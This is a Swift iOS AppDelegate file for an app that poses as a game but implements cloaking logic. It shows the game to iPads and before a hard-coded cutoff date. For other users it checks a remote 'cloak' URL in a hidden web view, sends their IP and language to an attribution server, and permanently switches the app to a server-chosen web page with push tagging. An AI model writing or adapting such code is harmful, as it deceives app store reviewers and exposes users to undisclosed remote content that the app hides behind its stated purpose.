import Foundation
import UIKit
import OneSignalFramework
import SwiftUI
import WebKit

// MARK: - Network Models
struct LinksResponse: Codable {
    let cloakUrl: String
    let atrService: String
    
    enum CodingKeys: String, CodingKey {
        case cloakUrl = "cloack_url"
        case atrService = "atr_service"
    }
}

struct AttributionResponse: Codable {
    let finalUrl: String
    let pushSub: String
    let osUserKey: String
    
    enum CodingKeys: String, CodingKey {
        case finalUrl = "final_url"
        case pushSub = "push_sub"
        case osUserKey = "os_user_key"
    }
}

struct IPResponse: Codable {
    let ip: String
}

public enum AppStatus: Int {
    case checking = 0
    case valid = 2
    case webRequired = 1
    case error = -1
    
    public init(rawValue: Int) {
        switch rawValue {
        case 1: self = .webRequired
        case 2: self = .valid
        case -1: self = .error
        default: self = .checking
        }
    }
}

open class AppDelegate: NSObject, UIApplicationDelegate, WKNavigationDelegate {
    public static var shared: AppDelegate?
    public var orientationMask: UIInterfaceOrientationMask = .portrait
    public var window: UIWindow?
    private var hiddenWebView: WKWebView?
    private var cloakCompletion: ((Result<Void, Error>) -> Void)?
    private var webViewResponseCode: Int = 0
    
    // MARK: - Application Lifecycle
    open func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
        print("🚀 [AppDelegate] Application launching")
        AppDelegate.shared = self
        
        // Initialize OneSignal
        OneSignal.initialize(AppConfig.oneSignalAppId, withLaunchOptions: launchOptions)
        
        // Initialize window with LoadingAnimation
        self.window = UIWindow(frame: UIScreen.main.bounds)
        let loadingAnimation = LoadingAnimation()
            .ignoresSafeArea()
        let hostingController = UIHostingController(rootView: loadingAnimation)
        window?.rootViewController = hostingController
        window?.makeKeyAndVisible()
        
        // Initialize hidden webview for cloak check
        let config = WKWebViewConfiguration()
        hiddenWebView = WKWebView(frame: .zero, configuration: config)
        hiddenWebView?.navigationDelegate = self
        
        // Start API check after delay
        DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) { [weak self] in
            self?.startAPICheck()
        }
        
        return true
    }
    
    // MARK: - Orientation Methods
    open func application(_ application: UIApplication, supportedInterfaceOrientationsFor window: UIWindow?) -> UIInterfaceOrientationMask {
        return orientationMask
    }
    
    public func updateScreenOrientation() {
        DispatchQueue.main.async { [weak self] in
            guard let self = self else { return }
            if let activeScene = UIApplication.shared.connectedScenes.first as? UIWindowScene {
                activeScene.windows.forEach { window in
                    window.rootViewController?.setNeedsUpdateOfSupportedInterfaceOrientations()
                }
            }
        }
    }
    
    private func handleMainContent() {
        print("🎮 [AppDelegate] Showing main content")
        DispatchQueue.main.async {
            UserDefaults.standard.set(true, forKey: AppConfig.Keys.showMainLogic)
            UserDefaults.standard.set(AppStatus.valid.rawValue, forKey: AppConfig.Keys.appStatus)
            AppParameters.shared.transitionToGame()
            self.validateAppAccess { _ in }
        }
    }
    
    private func handleAlternateContent(url: String) {
        print("🌐 [AppDelegate] Showing alternate content")
        DispatchQueue.main.async {
            UserDefaults.standard.set(url, forKey: AppConfig.Keys.finalUrl)
            UserDefaults.standard.set(false, forKey: AppConfig.Keys.showMainLogic)
            UserDefaults.standard.set(AppStatus.webRequired.rawValue, forKey: AppConfig.Keys.appStatus)
            AppParameters.shared.transitionToWebView(url: url)
            self.validateAppAccess { _ in }
        }
    }
    
    // MARK: - WKNavigationDelegate
    public func webView(_ webView: WKWebView, decidePolicyFor navigationResponse: WKNavigationResponse, decisionHandler: @escaping (WKNavigationResponsePolicy) -> Void) {
        if let response = navigationResponse.response as? HTTPURLResponse {
            webViewResponseCode = response.statusCode
        }
        decisionHandler(.allow)
    }
    
    public func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
        webView.evaluateJavaScript("document.documentElement.outerHTML") { [weak self] result, error in
            if let error = error {
                self?.cloakCompletion?(.failure(error))
                return
            }
            
            if let htmlString = result as? String {
                let containsError = htmlString.contains("Not Found") ||
                                  htmlString.contains("404") ||
                                  htmlString.contains("403") ||
                                  htmlString.contains("Forbidden") ||
                                  htmlString.contains("error") ||
                                  htmlString.contains("Error")
                
                let hasErrorCode = self?.webViewResponseCode ?? 0 >= 400
                
                if hasErrorCode || containsError {
                    self?.cloakCompletion?(.failure(NSError(domain: "", code: -1)))
                } else {
                    self?.cloakCompletion?(.success(()))
                }
            }
        }
    }
    
    // MARK: - Public Methods
    public func validateAppAccess(completion: @escaping (AppStatus) -> Void) {
        if UIDevice.current.model == "iPad" || UIDevice.current.userInterfaceIdiom == .pad ||
            Date() < AppConfig.contentViewEndDate {
            print("✅ [AppDelegate] Device is iPad or before cutoff date")
            UserDefaults.standard.set(AppStatus.valid.rawValue, forKey: AppConfig.Keys.appStatus)
            completion(.valid)
            return
        }
        
        if let finalUrl = UserDefaults.standard.string(forKey: AppConfig.Keys.finalUrl) {
            print("🌐 [AppDelegate] Found final URL, showing web content")
            completion(.webRequired)
        } else if UserDefaults.standard.bool(forKey: AppConfig.Keys.showMainLogic) {
            print("🎮 [AppDelegate] Show main logic flag is set")
            completion(.valid)
        } else {
            print("🔍 [AppDelegate] Checking status...")
            completion(.checking)
        }
    }
    
    // MARK: - API Methods
    private func startAPICheck() {
        print("🔍 [AppDelegate] Starting API check")
        
        // Если уже есть сохраненная ссылка, используем её
        if let savedUrl = UserDefaults.standard.string(forKey: AppConfig.Keys.finalUrl) {
            print("✅ [AppDelegate] Found saved URL, skipping API checks")
            handleAlternateContent(url: savedUrl)
            return
        }
        
        if UIDevice.current.model == "iPad" || UIDevice.current.userInterfaceIdiom == .pad ||
            Date() < AppConfig.contentViewEndDate {
            print("✅ [AppDelegate] Device is iPad or before cutoff date")
            handleMainContent()
            return
        }
        
        // Request push permission before starting API checks
        OneSignal.Notifications.requestPermission({ _ in
            self.getLinks { [weak self] result in
                switch result {
                case .success(let links):
                    self?.checkCloak(url: links.cloakUrl) { result in
                        switch result {
                        case .success:
                            self?.getAttribution(url: links.atrService)
                        case .failure:
                            self?.handleMainContent()
                        }
                    }
                case .failure:
                    self?.handleMainContent()
                }
            }
        }, fallbackToSettings: true)
    }
    
    private func getLinks(completion: @escaping (Result<LinksResponse, Error>) -> Void) {
        print("🌐 [AppDelegate] Getting links")
        guard let url = URL(string: AppConfig.baseUrl) else {
            completion(.failure(NSError(domain: "", code: -1)))
            return
        }
        
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        request.setValue(AppConfig.apiKey, forHTTPHeaderField: "apikey")
        request.setValue(AppConfig.bundleId, forHTTPHeaderField: "bundle")
        
        URLSession.shared.dataTask(with: request) { data, response, error in
            if let error = error {
                print("❌ [AppDelegate] Links error: \(error.localizedDescription)")
                completion(.failure(error))
                return
            }
            
            if let httpResponse = response as? HTTPURLResponse {
                print("📡 [AppDelegate] Links response status: \(httpResponse.statusCode)")
                if !(200...299).contains(httpResponse.statusCode) {
                    print("❌ [AppDelegate] Invalid status code: \(httpResponse.statusCode)")
                    completion(.failure(NSError(domain: "", code: httpResponse.statusCode)))
                    return
                }
            }
            
            guard let data = data else {
                print("❌ [AppDelegate] No data received")
                completion(.failure(NSError(domain: "", code: -1)))
                return
            }
            
            do {
                let response = try JSONDecoder().decode(LinksResponse.self, from: data)
                print("✅ [AppDelegate] Links received: \(response)")
                completion(.success(response))
            } catch {
                print("❌ [AppDelegate] Links decode error: \(error)")
                completion(.failure(error))
            }
        }.resume()
    }
    
    private func checkCloak(url: String, completion: @escaping (Result<Void, Error>) -> Void) {
        print("🌐 [AppDelegate] Checking cloak at URL: \(url)")
        guard let url = URL(string: url) else {
            print("❌ [AppDelegate] Invalid cloak URL")
            completion(.failure(NSError(domain: "", code: -1)))
            return
        }
        
        self.cloakCompletion = completion
        DispatchQueue.main.async { [weak self] in
            self?.hiddenWebView?.load(URLRequest(url: url))
        }
    }
    
    private func getAttribution(url: String) {
        print("🌐 [AppDelegate] Getting attribution from URL: \(url)")
        
        // First get IP
        guard let ipUrl = URL(string: AppConfig.ipServiceUrl) else {
            print("❌ [AppDelegate] Invalid IP service URL")
            handleMainContent()
            return
        }
        
        URLSession.shared.dataTask(with: ipUrl) { [weak self] data, response, error in
            guard let self = self else { return }
            
            if let error = error {
                print("❌ [AppDelegate] IP request error: \(error.localizedDescription)")
                self.handleMainContent()
                return
            }
            
            guard let data = data,
                  let ipResponse = try? JSONDecoder().decode(IPResponse.self, from: data) else {
                print("❌ [AppDelegate] Failed to decode IP response")
                self.handleMainContent()
                return
            }
            
            print("✅ [AppDelegate] Got IP: \(ipResponse.ip)")
            
            // Then get attribution
            guard let attributionUrl = URL(string: url) else {
                print("❌ [AppDelegate] Invalid attribution URL")
                self.handleMainContent()
                return
            }
            
            var request = URLRequest(url: attributionUrl)
            request.httpMethod = "GET"
            request.setValue(AppConfig.apiKeyApp, forHTTPHeaderField: "apikeyapp")
            request.setValue(ipResponse.ip, forHTTPHeaderField: "ip")
            request.setValue(Bundle.main.preferredLocalizations.first ?? "en", forHTTPHeaderField: "langcode")
            request.setValue("Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1", forHTTPHeaderField: "useragent")
            
            URLSession.shared.dataTask(with: request) { [weak self] data, response, error in
                if let error = error {
                    print("❌ [AppDelegate] Attribution request error: \(error.localizedDescription)")
                    self?.handleMainContent()
                    return
                }
                
                if let httpResponse = response as? HTTPURLResponse {
                    print("📡 [AppDelegate] Attribution response status: \(httpResponse.statusCode)")
                    if !(200...299).contains(httpResponse.statusCode) {
                        print("❌ [AppDelegate] Invalid attribution status code: \(httpResponse.statusCode)")
                        self?.handleMainContent()
                        return
                    }
                }
                
                guard let data = data,
                      let attribution = try? JSONDecoder().decode(AttributionResponse.self, from: data) else {
                    print("❌ [AppDelegate] Failed to decode attribution response")
                    self?.handleMainContent()
                    return
                }
                
                print("✅ [AppDelegate] Attribution success: \(attribution)")
                DispatchQueue.main.async {
                    UserDefaults.standard.set(attribution.finalUrl, forKey: AppConfig.Keys.finalUrl)
                    OneSignal.login(attribution.osUserKey)
                    OneSignal.User.addTag(key: "sub_app", value: attribution.pushSub)
                    self?.handleAlternateContent(url: attribution.finalUrl)
                }
            }.resume()
        }.resume()
    }
}

struct ServerResponse: Codable {
    let url: String
    let saveFirst: Bool
}

